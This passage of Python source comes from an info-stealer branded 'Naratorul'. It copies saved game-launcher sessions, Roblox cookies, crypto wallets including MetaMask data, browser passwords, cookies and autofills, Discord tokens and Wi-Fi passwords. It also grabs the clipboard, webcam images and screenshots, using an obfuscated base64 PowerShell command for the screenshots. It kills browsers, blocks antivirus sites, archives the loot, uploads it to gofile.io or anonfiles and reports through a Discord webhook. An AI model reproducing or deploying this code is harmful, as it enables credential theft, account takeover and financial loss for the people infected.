                            shutil.copy(filepath, os.path.join(self.TempFolder, 'Common Files', name, file))
                            self.CommonFilesCount += 1
                        except:
                            pass

    @Errors.Catch
    def StealMinecraft(self):
        if not Settings.CaptureGames:
            return
        saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
        userProfile = os.getenv('userprofile')
        roaming = os.getenv('appdata')
        minecraftPaths = {
            'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'),
            'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'),
            'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'),
            'Feather': os.path.join(roaming, '.feather', 'accounts.json'),
            'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'),
            'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'),
            'Novoline': os.path.join(roaming, '.minecraft', 'Novoline', 'alts.novo'),
            'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'),
            'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'),
            'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'),
            'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'),
            'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'),
            'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'),
            'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')
        }
        for name, path in minecraftPaths.items():
            if os.path.isfile(path):
                try:
                    os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                    self.MinecraftSessions += 1
                except:
                    pass

    @Errors.Catch
    def StealGrowtopia(self):
        if not Settings.CaptureGames:
            return
        growtopiadirs = list(set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None]))
        saveToPath = os.path.join(self.TempFolder, 'Games', 'Growtopia')
        multiple = len(growtopiadirs) > 1
        for index, path in enumerate(growtopiadirs):
            targetFilePath = os.path.join(path, 'save.dat')
            if os.path.isfile(targetFilePath):
                try:
                    _saveToPath = saveToPath if not multiple else os.path.join(saveToPath, 'Profile %d' % (index + 1))
                    os.makedirs(_saveToPath, exist_ok=True)
                    shutil.copy(targetFilePath, os.path.join(_saveToPath, 'save.dat'))
                    self.GrowtopiaStolen = True
                except:
                    shutil.rmtree(_saveToPath, ignore_errors=True)
        if multiple and self.GrowtopiaStolen:
            with open(os.path.join(saveToPath, 'Info.txt'), 'w') as f:
                f.write('Multiple Growtopia installations found, each in separate profile folders.')

    @Errors.Catch
    def StealEpic(self):
        if not Settings.CaptureGames:
            return
        saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
        epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
        if os.path.isdir(epicPath):
            loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
            if os.path.isfile(loginFile):
                with open(loginFile) as f:
                    contents = f.read()
                if '[RememberMe]' in contents:
                    try:
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                        self.EpicStolen = True
                    except:
                        pass

    @Errors.Catch
    def StealSteam(self):
        if not Settings.CaptureGames:
            return
        saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
        steamPaths = list(set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None]))
        if not steamPaths:
            steamPaths = ['C:\\Program Files (x86)\\Steam']
        multiple = len(steamPaths) > 1
        for index, steamPath in enumerate(steamPaths):
            steamConfigPath = os.path.join(steamPath, 'config')
            if os.path.isdir(steamConfigPath):
                loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
                if os.path.isfile(loginFile):
                    with open(loginFile) as f:
                        contents = f.read()
                    if '"RememberPassword"\t\t"1"' in contents:
                        try:
                            _saveToPath = saveToPath if not multiple else os.path.join(saveToPath, 'Profile %d' % (index + 1))
                            os.makedirs(_saveToPath, exist_ok=True)
                            shutil.copytree(steamConfigPath, os.path.join(_saveToPath, 'config'), dirs_exist_ok=True)
                            for item in os.listdir(steamPath):
                                if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                    shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                                    self.SteamStolen = True
                        except:
                            pass
        if multiple and self.SteamStolen:
            with open(os.path.join(saveToPath, 'Info.txt'), 'w') as f:
                f.write('Multiple Steam installations found.')

    @Errors.Catch
    def StealUplay(self):
        if not Settings.CaptureGames:
            return
        saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
        uplayPath = os.path.join(os.getenv('localappdata'), 'Ubisoft Game Launcher')
        if os.path.isdir(uplayPath):
            for item in os.listdir(uplayPath):
                itempath = os.path.join(uplayPath, item)
                if os.path.isfile(itempath):
                    try:
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copy(itempath, os.path.join(saveToPath, item))
                        self.UplayStolen = True
                    except:
                        pass

    @Errors.Catch
    def StealRobloxCookies(self):
        if not Settings.CaptureGames:
            return
        saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
        note = '# These cookies may or may not work.'
        cookies = []
        browserCookies = '\n'.join(self.Cookies)
        for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
            cookies.append(match)
        output = []
        for item in ('HKCU', 'HKLM'):
            try:
                proc = subprocess.run('powershell Get-ItemPropertyValue -Path %s:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY' % item, capture_output=True, shell=True)
                if proc.returncode == 0:
                    output.append(proc.stdout.decode(errors='ignore'))
            except:
                pass
        for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
            cookies.append(match)
        cookies = list(set(cookies))
        if cookies:
            os.makedirs(saveToDir, exist_ok=True)
            with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as f:
                f.write(note + '\n\n' + '\n\n'.join(cookies))
            self.RobloxCookiesCount += len(cookies)

    @Errors.Catch
    def StealWallets(self):
        if not Settings.CaptureWallets:
            return
        saveToDir = os.path.join(self.TempFolder, 'Wallets')
        wallets = (
            ('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')),
            ('Armory', os.path.join(os.getenv('appdata'), 'Armory')),
            ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')),
            ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')),
            ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')),
            ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')),
            ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')),
            ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')),
            ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')),
            ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets'))
        )
        browserPaths = {
            'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'),
            'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'),
            'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')
        }
        for name, path in wallets:
            if os.path.isdir(path):
                try:
                    _saveToDir = os.path.join(saveToDir, name)
                    os.makedirs(_saveToDir, exist_ok=True)
                    shutil.copytree(path, _saveToDir, dirs_exist_ok=True)
                    with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as f:
                        f.write(path)
                    self.WalletsCount += 1
                except:
                    pass
        for name, path in browserPaths.items():
            if os.path.isdir(path):
                for root, dirs, _ in os.walk(path):
                    for d in dirs:
                        if d == 'Local Extension Settings':
                            extPath = os.path.join(root, d)
                            for ext in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                extDir = os.path.join(extPath, ext)
                                if os.path.isdir(extDir) and os.listdir(extDir):
                                    try:
                                        metamask_browser = os.path.join(saveToDir, 'Metamask (%s)' % name)
                                        os.makedirs(metamask_browser, exist_ok=True)
                                        shutil.copytree(extDir, os.path.join(metamask_browser, ext), dirs_exist_ok=True)
                                        self.WalletsCount += 1
                                    except:
                                        pass

    @Errors.Catch
    def StealSystemInfo(self):
        if not Settings.CaptureSystemInfo:
            return
        saveToDir = os.path.join(self.TempFolder, 'System')
        try:
            proc = subprocess.run('systeminfo', capture_output=True, shell=True)
            out = proc.stdout.decode(errors='ignore').strip()
            if out:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as f:
                    f.write(out)
                self.SystemInfoStolen = True
        except:
            pass
        try:
            proc = subprocess.run('getmac', capture_output=True, shell=True)
            out = proc.stdout.decode(errors='ignore').strip()
            if out:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as f:
                    f.write(out)
        except:
            pass

    @Errors.Catch
    def GetDirectoryTree(self):
        if not Settings.CaptureSystemInfo:
            return
        PIPE = chr(9474) + '   '
        TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
        ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
        output = {}
        for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')),
                          ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')),
                          ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')),
                          ('Music', os.path.join(os.getenv('userprofile'), 'Music')),
                          ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')),
                          ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
            if os.path.isdir(dir):
                try:
                    proc = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=dir)
                    if proc.returncode == 0:
                        lines = proc.stdout.decode(errors='ignore').splitlines()
                        if len(lines) > 3:
                            tree = '\n'.join(lines[3:])
                            tree = tree.replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
                            output[name] = name + '\n' + tree
                except:
                    pass
        for key, val in output.items():
            os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
            with open(os.path.join(self.TempFolder, 'Directories', key + '.txt'), 'w', encoding='utf-8') as f:
                f.write(val)

    @Errors.Catch
    def GetClipboard(self):
        if not Settings.CaptureSystemInfo:
            return
        try:
            proc = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
            if proc.returncode == 0:
                content = proc.stdout.decode(errors='ignore').strip()
                if content:
                    os.makedirs(os.path.join(self.TempFolder, 'System'), exist_ok=True)
                    with open(os.path.join(self.TempFolder, 'System', 'Clipboard.txt'), 'w', encoding='utf-8') as f:
                        f.write(content)
        except:
            pass

    @Errors.Catch
    def GetAntivirus(self):
        if not Settings.CaptureSystemInfo:
            return
        try:
            proc = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
            if proc.returncode == 0:
                lines = proc.stdout.decode(errors='ignore').strip().splitlines()
                if len(lines) > 1:
                    avs = [line.strip() for line in lines[1:] if line.strip()]
                    if avs:
                        os.makedirs(os.path.join(self.TempFolder, 'System'), exist_ok=True)
                        with open(os.path.join(self.TempFolder, 'System', 'Antivirus.txt'), 'w', encoding='utf-8') as f:
                            f.write('\n'.join(avs))
        except:
            pass

    @Errors.Catch
    def GetTaskList(self):
        if not Settings.CaptureSystemInfo:
            return
        try:
            proc = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
            out = proc.stdout.decode(errors='ignore').strip()
            if out:
                os.makedirs(os.path.join(self.TempFolder, 'System'), exist_ok=True)
                with open(os.path.join(self.TempFolder, 'System', 'Task List.txt'), 'w', errors='ignore') as f:
                    f.write(out)
        except:
            pass

    @Errors.Catch
    def GetWifiPasswords(self):
        if not Settings.CaptureWifiPasswords:
            return
        passwords = Utility.GetWifiPasswords()
        if passwords:
            saveToDir = os.path.join(self.TempFolder, 'System')
            os.makedirs(saveToDir, exist_ok=True)
            lines = []
            for network, pwd in passwords.items():
                lines.append('Network: %s\nPassword: %s' % (network, pwd))
            with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8') as f:
                f.write('\n\n'.join(lines))
            self.WifiPasswordsCount += len(passwords)

    @Errors.Catch
    def TakeScreenshot(self):
        if not Settings.CaptureScreenshot:
            return
        command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
        try:
            proc = subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command],
                                  shell=True, capture_output=True, cwd=self.TempFolder)
            if proc.returncode == 0:
                self.ScreenshotTaken = True
        except:
            pass

    @Errors.Catch
    def BlockSites(self):
        if Settings.BlockAvSites:
            Utility.BlockSites()
            Utility.TaskKill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')

    @Errors.Catch
    def StealBrowserData(self):
        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory, Settings.CaptureAutofills)):
            return
        paths = {
            'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'),
            'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'),
            'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')
        }
        threads = []
        for name, path in paths.items():
            if not os.path.isdir(path):
                continue
            def process_browser(name, path):
                try:
                    Utility.TaskKill(name.lower())
                    browser = Browsers.Chromium(path)
                    saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                    passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                    cookies = browser.GetCookies() if Settings.CaptureCookies else None
                    history = browser.GetHistory() if Settings.CaptureHistory else None
                    autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
                    if passwords or cookies or history or autofills:
                        os.makedirs(saveToDir, exist_ok=True)
                        if passwords:
                            lines = ['URL: %s\nUsername: %s\nPassword: %s' % (url, user, pwd) for url, user, pwd in passwords]
                            with open(os.path.join(saveToDir, name + ' Passwords.txt'), 'w', encoding='utf-8') as f:
                                f.write('\n\n'.join(lines))
                            self.PasswordsCount += len(passwords)
                        if cookies:
                            lines = ['%s\t%s\t%s\t%s' % (host, cname, cpath, cookie) for host, cname, cpath, cookie, _ in cookies]
                            with open(os.path.join(saveToDir, name + ' Cookies.txt'), 'w', encoding='utf-8') as f:
                                f.write('\n'.join(lines))
                            self.Cookies.extend([c[3] for c in cookies])
                        if history:
                            lines = ['URL: %s\nTitle: %s\nVisits: %s' % (url, title, vc) for url, title, vc in history]
                            with open(os.path.join(saveToDir, name + ' History.txt'), 'w', encoding='utf-8') as f:
                                f.write('\n\n'.join(lines))
                            self.HistoryCount += len(history)
                        if autofills:
                            with open(os.path.join(saveToDir, name + ' Autofills.txt'), 'w', encoding='utf-8') as f:
                                f.write('\n'.join(autofills))
                            self.AutofillCount += len(autofills)
                except:
                    pass
            t = Thread(target=process_browser, args=(name, path))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self):
        if not Settings.CaptureWebcam:
            return
        camdir = os.path.join(self.TempFolder, 'Webcam')
        os.makedirs(camdir, exist_ok=True)
        camIndex = 0
        max_attempts = 2
        while camIndex < max_attempts:
            filepath = os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))
            if Syscalls.CaptureWebcam(camIndex, filepath):
                self.WebcamPicturesCount += 1
                camIndex += 1
            else:
                break
        if self.WebcamPicturesCount == 0:
            shutil.rmtree(camdir, ignore_errors=True)

    @Errors.Catch
    def StealDiscordTokens(self):
        if not Settings.CaptureDiscordTokens:
            return
        accounts = Discord.GetTokens()
        if not accounts:
            return
        saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
        os.makedirs(saveToDir, exist_ok=True)
        lines = []
        for acc in accounts:
            lines.append("Username: %s\nUser ID: %s\nMFA: %s\nEmail: %s\nPhone: %s\nVerified: %s\nNitro: %s\nBilling: %s\nToken: %s\n%s" % (acc['USERNAME'], acc['USERID'], acc['MFA'], acc['EMAIL'], acc['PHONE'], acc['VERIFIED'], acc['NITRO'], acc['BILLING'], acc['TOKEN'], acc['GIFTS']))
        with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8') as f:
            f.write('\n\n'.join(lines))
        self.DiscordTokensCount = len(accounts)

    def CreateArchive(self):
        try:
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe') if hasattr(sys, '_MEIPASS') else 'rar.exe'
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'blank123'
                proc = subprocess.run('"%s" a -r -hp"%s" "%s" *' % (rarPath, password, self.ArchivePath), shell=True, capture_output=True, cwd=self.TempFolder)
                if proc.returncode == 0:
                    return 'rar'
        except:
            pass
        try:
            shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
            return 'zip'
        except:
            return None

    def UploadToExternalService(self, path, filename=None):
        try:
            with open(path, 'rb') as f:
                file_bytes = f.read()
            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager(cert_reqs='CERT_NONE')
            server_resp = http.request('GET', 'https://api.gofile.io/getServer')
            server_data = json.loads(server_resp.data.decode(errors='ignore'))
            if server_data.get('status') == 'ok':
                server = server_data['data']['server']
                if server:
                    upload_resp = http.request('POST', 'https://%s.gofile.io/uploadFile' % server,
                                               fields={'file': (filename, file_bytes)})
                    upload_data = json.loads(upload_resp.data.decode(errors='ignore'))
                    if upload_data.get('status') == 'ok':
                        return upload_data['data']['downloadPage']
            upload_resp = http.request('POST', 'https://api.anonfiles.com/upload',
                                       fields={'file': (filename, file_bytes)})
            upload_data = json.loads(upload_resp.data.decode(errors='ignore'))
            if upload_data.get('status', {}).get('finished', False):
                return upload_data['data']['file']['url']['short']
        except:
            pass
        return None

    def SendData(self):
        try:
            ext = self.CreateArchive()
            if not ext or not os.path.isfile(self.ArchivePath):
                return
            computerName = os.getenv('computername') or 'Unknown'
            try:
                os_caption = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
                computerOS = os_caption[2].strip() if len(os_caption) >= 3 else 'Unknown'
            except:
                computerOS = 'Unknown'
            try:
                totalMem = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
                totalMemory = '%s GB' % str(int(int(totalMem[1]) / 1000000000)) if len(totalMem) >= 2 else 'Unknown'
            except:
                totalMemory = 'Unknown'
            try:
                uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
                uuid_str = uuid[1].strip() if len(uuid) >= 2 else 'Unknown'
            except:
                uuid_str = 'Unknown'
            try:
                cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unknown'
            except:
                cpu = 'Unknown'
            try:
                gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
                gpu_str = gpu[2].strip() if len(gpu) >= 3 else 'Unknown'
            except:
                gpu_str = 'Unknown'
            try:
                productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unknown'
            except:
                productKey = 'Unknown'

            system_info = "Computer Name: %s\nOS: %s\nRAM: %s\nUUID: %s\nCPU: %s\nGPU: %s\nProduct Key: %s" % (computerName, computerOS, totalMemory, uuid_str, cpu, gpu_str, productKey)

            try:
                http = PoolManager(cert_reqs='CERT_NONE', headers={'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'])})
                r = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
                if r.get('status') == 'success':
                    ipinfo = "IP: %s\nRegion: %s\nCountry: %s\nTimezone: %s\nMobile: %s\nProxy: %s" % (r['query'], r.get('regionName',''), r.get('country',''), r.get('timezone',''), r.get('mobile',False), r.get('proxy',False))
                else:
                    ipinfo = 'Unable to get IP info'
            except:
                ipinfo = 'Unable to get IP info'

            collection = {
                'Discord Accounts': self.DiscordTokensCount,
                'Passwords': self.PasswordsCount,
                'Cookies': len(self.Cookies),
                'History': self.HistoryCount,
                'Autofills': self.AutofillCount,
                'Roblox Cookies': self.RobloxCookiesCount,
                'Common Files': self.CommonFilesCount,
                'Wallets': self.WalletsCount,
                'Wifi Passwords': self.WifiPasswordsCount,
                'Webcam': self.WebcamPicturesCount,
                'Minecraft Sessions': self.MinecraftSessions,
                'Epic Session': 'Yes' if self.EpicStolen else 'No',
                'Steam Session': 'Yes' if self.SteamStolen else 'No',
                'Uplay Session': 'Yes' if self.UplayStolen else 'No',
                'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No',
                'Screenshot': 'Yes' if self.ScreenshotTaken else 'No',
                'System Info': 'Yes' if self.SystemInfoStolen else 'No'
            }
            grabbedInfo = '\n'.join([key + ' : ' + str(value) for (key, value) in collection.items()])

            # Discord only
            payload = {
                'content': '',
                'embeds': [{
                    'title': 'Naratorul',
                    'description': "**System Info**\n```%s```\n**IP Info**\n```%s```\n**Grabbed Info**\n```%s```" % (system_info, ipinfo, grabbedInfo),
                    'color': 34303
                }]
            }
            if os.path.getsize(self.ArchivePath) > 20 * 1024 * 1024:
                url = self.UploadToExternalService(self.ArchivePath, "Naratorul-%s.%s" % (os.getlogin(), ext))
                if url:
                    payload['content'] = 'Archive: %s' % url
                else:
                    return
            else:
                with open(self.ArchivePath, 'rb') as f:
                    file_data = f.read()
